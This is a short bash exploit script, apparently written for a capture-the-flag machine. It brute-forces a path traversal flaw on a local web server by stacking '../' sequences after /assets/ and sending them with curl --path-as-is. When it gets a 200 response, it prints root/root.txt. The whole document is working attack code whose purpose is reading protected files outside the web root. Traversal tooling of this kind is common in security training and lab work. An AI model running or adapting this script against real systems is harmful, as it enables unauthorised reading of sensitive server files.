#!/bin/bash

url="http://localhost:1234"
string="../"
payload="/assets/"
file="root/root.txt" # without the leading /

for ((i=0; i<50; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -m 5 -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        echo "[+] File found at $url$payload$file:"
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
